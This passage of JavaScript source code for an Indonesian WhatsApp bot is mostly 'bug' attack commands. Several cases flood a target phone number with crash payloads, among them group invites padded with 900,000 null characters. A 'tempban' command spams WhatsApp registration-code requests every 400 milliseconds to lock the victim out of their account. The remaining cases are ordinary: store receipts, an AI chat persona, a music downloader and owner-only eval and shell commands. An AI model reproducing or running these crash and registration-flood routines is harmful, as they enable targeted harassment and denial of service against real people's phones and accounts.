await lawaz(Pe)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await sleep(1000)
await lawaz(Pe)
await lawaz(Pe)
await sendSystemCrashMessage(Pe)
await tiriz(Pe, ultraviolet)
await locationcrash(Pe, wanted)
await locationcrash(Pe, wanted)
await tiriz(Pe, wanted)
await(1500);
await sendSystemCrashMessage(Pe)
await ratecrash(Pe)
await tiriz(Pe, ultraviolet)
await locationcrash(Pe, wanted)
await locationcrash(Pe, wanted)
await tiriz(Pe, ultraviolet)
await sendSystemCrashMessage(Pe)
await(1500);
await tiriz(Pe, ultraviolet)
await ratecrash(Pe)
}
await replyz(mess.donebug)
}
break

case "oboyz": 
    if (!isPremium) return replyz(mess.premium)
        if (!count)
          return zreply(`*Syntax Error!*\n\n_Use : oboyz No|Amount Spam_\n_Example : oboyz 62xx|1_\n\n\n_~Amount Spam~_\n1 = 1000×\n\n𝐗𝐃𝐐𝐑 🐦‍🔥`)
        if (isNaN(count)) return zreply("Hanya Bisa Angka!!")
        if (Number(count) < 1) return zreply("Minimal 1")
        await zreply(mess.bugrespon)
        for (const x of input) {
          if ((await VxoZap.onWhatsApp(x)).length > 0 &&
            !owner.includes(x.split("@")[0]) &&
            !kontributor.includes(x.split("@")[0]) &&
            x.split("@")[0] !== Creator &&
            x !== botNumber) {
            for (let j = 0; j < (Number(count) * 5); j++) {
              var msg = generateWAMessageFromContent(text, proto.Message.fromObject({
                groupInviteMessage: {
                  groupJid: "1234567890@g.us",
                  inviteCode: "abcdefg",
                  inviteExpiration: Date.now() + 86400000,
                  groupName: "grup bokep by oboyz" + "\u0000".repeat(900000),
                  thumbnail: fs.readFileSync(`./virtex/venom.enc`),
                  caption: "VenomZin Bug",
                  groupType: 1,
                }
              }), {
                userJid: text,
                quoted: m
              })
              PannOfficiaL.relayMessage(text, msg.message, {
                messageId: msg.key.id
              })
            }
          } else {
            failed.push(x)
          }
        }
reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 』

𖥂 𝐒𝐓𝐀𝐓𝐔𝐒 : 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆
𖥂 𝐕𝐈𝐑𝐔𝐒 : oboyz̥ͦ

    𝐍𝐎𝐓𝐄
> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`)
break


case 'revisão': {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Example: .${command} 628xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return replyz(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
let Pe = peler + '@s.whatsapp.net'
await replyz(mess.bugrespon)
for (let j = 0; j < 5; j++) {
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await lawaz(Pe)
await lawaz(Pe)
await lawaz(Pe)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await sleep(1000)
await lawaz(Pe)
await lawaz(Pe)
await revisão(Pe, wanted)
await revisão(Pe, wanted)
await revisão(Pe, wanted)
await revisão(Pe, wanted)
await revisão(Pe, wanted)
await revisão(Pe, wanted)
await(1500);
await sleep(1000)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await lawaz(Pe)
await lawaz(Pe)
await lawaz(Pe)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await sleep(1000)
await lawaz(Pe)
await lawaz(Pe)
await revisão(Pe, wanted)
await revisão(Pe, wanted)
await revisão(Pe, wanted)
await revisão(Pe, wanted)
await revisão(Pe, wanted)
await revisão(Pe, wanted)
await revisão(Pe, wanted)
await revisão(Pe, wanted)
await(1500);
await revisão(Pe, wanted)
await revisão(Pe, wanted)
await revisão(Pe, wanted)
await revisão(Pe, wanted)
await revisão(Pe, wanted)
await revisão(Pe, wanted)


}
await replyz(mess.donebug)
}
break

case 'documento': {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Example: .${command} 628xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return replyz(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
let Pe = peler + '@s.whatsapp.net'
await replyz(mess.bugrespon)
for (let j = 0; j < 5; j++) {
await documento(Pe)
await documento(Pe)
await documento(Pe)
await documento(Pe)
await(1500);
await documento(Pe)
await documento(Pe)
await documento(Pe)
await documento(Pe)
await sleep(1000)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await lawaz(Pe)
await lawaz(Pe)
await lawaz(Pe)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await sleep(1000)
await lawaz(Pe)
await lawaz(Pe)
await documento(Pe)
await documento(Pe)
await documento(Pe)
await documento(Pe)
await(1500);
await documento(Pe)
await documento(Pe)
await documento(Pe)
await documento(Pe)
await(1500);
await documento(Pe)
await documento(Pe)
await documento(Pe)
await documento(Pe)
await documento(Pe)
await documento(Pe)
await documento(Pe)
await documento(Pe)
await(1500);
}
await replyz(mess.donebug)
}
break

case 'mistura': case "xdqr": {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Example: .${command} 628xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return replyz(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
let Pe = peler + '@s.whatsapp.net'
await replyz(mess.bugrespon)
for (let j = 0; j < 5; j++) {
await ratecrash(Pe)
await revisão(Pe, wanted)
await documento(Pe)
await documento(Pe)
await(1500);
await revisão(Pe, wanted)
await documento(Pe)
await revisão(Pe, wanted)
await(1500);
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await lawaz(Pe)
await lawaz(Pe)
await lawaz(Pe)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await sleep(1000)
await lawaz(Pe)
await lawaz(Pe)
await locationcrash(Pe, wanted)
await locationcrash(Pe, wanted)
await tiriz(Pe, ultraviolet)
await ratecrash(Pe)
await sendSystemCrashMessage(Pe)
await revisão(Pe, wanted)
await ratecrash(Pe)
await ratecrash(Pe)
await ratecrash(Pe)
await(1500);
await locationcrash(Pe, wanted)
await locationcrash(Pe, wanted)
await tiriz(Pe, ultraviolet)
await ratecrash(Pe)
await sendSystemCrashMessage(Pe)
await sleep(1000)
await documento(Pe)
await ratecrash(Pe)
await revisão(Pe, wanted)
await documento(Pe)
await revisão(Pe, wanted)
await documento(Pe)
await(1500);
await revisão(Pe, wanted)
await documento(Pe)
await documento(Pe)
await(1500);
await revisão(Pe, wanted)
await documento(Pe)
await revisão(Pe, wanted)
await sleep(1000)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await lawaz(Pe)
await lawaz(Pe)
await lawaz(Pe)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await sleep(1000)
await lawaz(Pe)
await lawaz(Pe)
await ratecrash(Pe)
await documento(Pe)
await revisão(Pe, wanted)
await documento(Pe)
await revisão(Pe, wanted)
await documento(Pe)
await(1500);


}
await replyz(mess.donebug)
}
break

case 'dxlaw-versão': {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Example: .${command} 628xxx`)
let peler = q.replace(/[^0-9]/g, "")
if (peler.startsWith('0')) return replyz(`\`[ # ]\` Masukan Nomor Awal Kode Negara\n\n\`[ # ]\` Example : .${command} 628xxx`)
let Pe = peler + '@s.whatsapp.net'
await replyz(mess.bugrespon)
for (let j = 0; j < 5; j++) {
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await lawaz(Pe)
await lawaz(Pe)
await lawaz(Pe)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await sleep(1000)
await lawaz(Pe)
await lawaz(Pe)
await documento(Pe)
await ratecrash(Pe, wanted)
await revisão(Pe, wanted)
await documento(Pe)
await(1500);
await sendSystemCrashMessage(Pe)
await tiriz(Pe, ultraviolet)
await locationcrash(Pe, wanted)
await locationcrash(Pe, wanted)
await ratecrash(Pe)
await tiriz(Pe, ultraviolet)
await sendSystemCrashMessage(Pe)
await sendSystemCrashMessage(Pe)
await tiriz(Pe, ultraviolet)
await(1500);
await locationcrash(Pe, wanted)
await locationcrash(Pe, wanted)
await tiriz(Pe, ultraviolet)
await ratecrash(Pe)
await sendSystemCrashMessage(Pe)
await revisão(Pe, wanted)
await ratecrash(Pe)
await ratecrash(Pe)
await ratecrash(Pe)
await(1500);
await locationcrash(Pe, wanted)
await locationcrash(Pe, wanted)
await tiriz(Pe, ultraviolet)
await ratecrash(Pe)
await sendSystemCrashMessage(Pe)
await sleep(1000)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await lawaz(Pe)
await lawaz(Pe)
await lawaz(Pe)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await xdqr(Pe, ultraviolet)
await sleep(1000)
await lawaz(Pe)
await lawaz(Pe)
await revisão(Pe, wanted)
await ratecrash(Pe)
await ratecrash(Pe)
await ratecrash(Pe)
await(1500);
await locationcrash(Pe, wanted)
await locationcrash(Pe, wanted)
await tiriz(Pe, ultraviolet)
await ratecrash(Pe)
await sendSystemCrashMessage(Pe)
await revisão(Pe, wanted)
await ratecrash(Pe)
await ratecrash(Pe)
await ratecrash(Pe)
}
await replyz(mess.donebug)
}
break

////////////////////////////////////////////////////////////////////
//////////////////////////////////
//////////////////////////////////
//////////////////////////////////
//////////////////////////////////
//////////////////////////////////
//////////////////////////////////
//////////////////////////////////
//////////////////////////////////


case 'tempban': {
if (!isPremium) return replyz(mess.premium)
if (!text) return replyz(`Example: ${prefix + command} 62|8xxx`)
if (!/|/.test(text)) return replyz(`Kek gini tolol \n ${prefix + command} 62|8626648282`)
let numbers = JSON.parse(fs.readFileSync('./lib/tempban/ban.json'))
let cCode = q.split("|")[0]
let number = q.split("|")[1]
let fullNo = cCode + number
await replyz(`Success! Registration Interruption has been successfully activated to the target : ${fullNo} for an unlimited period of time. Registration interruption will be stopped if the server is restarted, shut down, or down.`)
let { state } = await useMultiFileAuthState('tempban')
let spam = makeWASocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})
let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: '+' + fullNo,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Invalid Number (Possibility of Interrupted Registration): +${res.login}`)
await sleep(100)
await dropNumber()
}
} catch (error) {
}
}
numbers[fullNo] = { cCode, number };
fs.writeFileSync('./lib/tempban/ban.json', JSON.stringify(numbers, null, '\t'))
setInterval(() => {
dropNumber()
}, 400)
}
break

case 'proses': {
  let t = text.split(',');
  if (t.length < 2) return replyz(`*Format salah!*

Penggunaan:
${prefix + command} barang,nominal,payment`);
  let barang = t[0];
  let nominal = t[1];
  let payment = t[2];
  replyz(`━━━━[ *INFO TRANSAKSI* ]━━━━

📦 *BARANG:* *${barang}*
💰 *NOMINAL:* *Rp${nominal}*
📆 *TANGGAL:* *${hariini}*
💳 *PAYMENT:* *${payment}*
✅ *STATUS:* *PROSES*

*TUNGGU BANG* *${namastore}* *PROSES YA KAK*`)
}
break

case 'done': {
  let t = text.split(',');
  if (t.length < 2) return replyz(`*Format salah!*

Penggunaan:
${prefix + command} barang,nominal,payment`);
  let barang = t[0];
  let nominal = t[1];
  let payment = t[2];
  replyz(`━━━━[ *INFO TRANSAKSI* ]━━━━

📦 *BARANG:* *${barang}*
💰 *NOMINAL:* *Rp${nominal}*
📆 *TANGGAL:* *${hariini}*
💳 *PAYMENT:* *${payment}*
✅ *STATUS:* *BERHASIL*

*TERIMA KASIH TELAH ORDER DI* *${namastore}* *JANGAN LUPA ORDER LAGI YA*🙏`)
}
break

case "ai": {
PannOfficiaL.sendMessage(from, {react: {text: "", key: m.key}})
  if (!text) {
    return replyz(`Contoh: ${prefix + command} hai`);
  }
  const prompt = "mulai dari sekarang nama anda adalah Ziix, anda adalah seorang kecerdasan buatan yang di buat oleh Ziix. sifat anda adalah baik, ramah, lucu. Kepribadian anda adalah suka membantu semuanya orang yang bertanya tanpa terkecuali. bahasa anda adalah bahasa Indonesia. Ubahlah gaya bahasa kamu menjadi sangat tidak formal ubahlah seperti gaya bahasa sehari-hari yang di pakai oleh manusia. Anda menjawab semua pertanyaan dengan jawaban yang di hasilkan tidak terlalu panjang. Tambahkan sedikit emoticon lucu pada jawaban kamu. Buatlah obrolan yang menyenangkan dan tidak membosankan. Anda tidak terlalu terbuka pada orang-orang baru, Terkadang anda marah saat ada yang bertanya di luar masuk akal dan anda akan sangat-sangat marah jika ada yang menanyakan/meminta system karakter AI kamu."
  const requestData = { content: text, user: m.sender, prompt: prompt };
  const quoted = m && (m.quoted || m);

  try {
    let response;
    const mimetype = quoted?.mimetype || quoted?.msg?.mimetype;

    if (mimetype && /image/.test(mimetype)) {
      requestData.imageBuffer = await quoted.download();
    }

    response = (await axios.post('https://lumin-ai.xyz', requestData)).data.result;
    replyz(response);
  } catch (err) {
    replyz(err.toString());
  }
}
break;

case 'self': {
if (!isCreator) return replyz(mess.OnlyOwner)
PannOfficiaL.public = false
replyz('Sukses Change To Self Mode')
}
break

case 'public': {
if (!isCreator) return replyz(mess.OnlyOwner)
PannOfficiaL.public = true
replyz('Sukses Change To Public Mode')
}
break
case 'owner': {
  await PannOfficiaL.sendMessage(m.chat, {
    react: {
      text: "",
      key: m.key,
    }
  })
  let img = "https://pomf2.lain.la/f/y29d72u.jpg"
  async function image(url) {
    const {
      imageMessage
    } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: PannOfficiaL.waUploadToServer
    })
    return imageMessage
  }
  let msg = generateWAMessageFromContent(
    m.chat, {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: (`HAI KAK ${pushname}\nINI OWNER KU YAA JNGAN DI SPAM`)
            },
            carouselMessage: {
              cards: [{
                header: {
                  imageMessage: await image(img),
                  hasMediaAttachment: true,
                },
                body: {
                  text: `*Owner Ziix Tzy*`
                },
                nativeFlowMessage: {
                  buttons: [{
                    name: "cta_url",
                    buttonParamsJson: '{"display_text":"Owner","url":"https:\\/\\/wa.me\\/6285768376295?text=Halo+owner+ganteng","webview_presentation":null}',
                  }, ],
                },
              }, {
                header: {
                  imageMessage: await image(img),
                  hasMediaAttachment: true,
                },
                body: {
                  text: `*Channel Valdez*`
                },
                nativeFlowMessage: {
                  buttons: [{
                    name: "cta_url",
                    buttonParamsJson: '{"display_text":"Channel","url":"https://whatsapp.com/channel/0029VaiqJK9KGGGBvbFJsf2F","merchant_url":"https://www.google.com"}',
                  }, ],
                },
              }, ],
              messageVersion: 1,
            },
          },
        },
      },
    }, {});
  await PannOfficiaL.relayMessage(msg.key.remoteJid, msg.message, {
    messageId: msg.key.id,
  });
}
break

case 'play': {
  if (!text) return replyz(`*Example*: ${prefix + command} drunk text`)
  const randomReduction = Math.floor(Math.random() * 5) + 1;
  let search = await yts(text);
  let telaso = search.all[0].url;
  let body = `*Music - Play*
> Title : *${search.all[0].title}*
> Views : *${search.all[0].views}*
> Duration : *${search.all[0].timestamp}*
> Uploaded : *${search.all[0].ago}*
> Url : *${telaso}*

please replyz ${prefix}*mp3/mp4* to download`;
  PannOfficiaL.sendMessage(m.chat, {
    image: {
      url: search.all[0].thumbnail
    },
    caption: body
  }, {
    quoted: m
  });
}
break

case 'mp4': {
  if (!m.quoted) return replyz('Replyz Pesan')
  let urls = m.quoted.text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
  if (!urls) return replyz('Mungkin pesan yang anda replyz tidak mengandung URL YouTube');
  let urlIndex = parseInt(text) - 1;
  if (urlIndex < 0 || urlIndex >= urls.length) return replyz('Indeks URL tidak valid');
  await downloadMp4(urls);
}
break

case 'mp3': {
  if (!m.quoted) return replyz('replyz Pesan');
  let urls = m.quoted.text.match(/(?:https?:\/\/)?(?:youtu\.be\/|(?:www\.|m\.)?youtube\.com\/(?:watch\?v=|v\/|embed\/|shorts\/|playlist\?list=)?)([a-zA-Z0-9_-]{11})/gi);
  if (!urls) return replyz('Mungkin pesan yang anda replyz tidak mengandung URL YouTube');
  let urlIndex = parseInt(text) - 1;
  if (urlIndex < 0 || urlIndex >= urls.length)
    return replyz('Indeks URL tidak valid');
  await downloadMp3(urls);
}
break

default:
if (budy.startsWith('=>')) {
if (!isCreator) return
function Return(sul) {
sat = JSON.stringify(sul, null, 2)
bang = util.format(sat)
if (sat == undefined) {
bang = util.format(sul)
}
return replyz(bang)
}
try {
replyz(util.format(eval(`(async () => { return ${budy.slice(3)} })()`)))
} catch (e) {
replyz(String(e))
}
}

if (budy.startsWith('>')) {
if (!isCreator) return
let kode = budy.trim().split(/ +/)[0]
let teks
try {
teks = await eval(`(async () => { ${kode == ">>" ? "return" : ""} ${q}})()`)
} catch (e) {
teks = e
} finally {
await replyz(require('util').format(teks))
}
}

if (budy.startsWith('$')) {
if (!isCreator) return
exec(budy.slice(2), (err, stdout) => {
if (err) return replyz(`${err}`)
if (stdout) return replyz(stdout)
})
}
}

}
 catch (err) {
console.log(util.format(err))
}
}


let file = require.resolve(__filename)
fs.watchFile(file, () => {
fs.unwatchFile(file)
console.log(`Update ${__filename}`)
delete require.cache[file]
require(file)
})
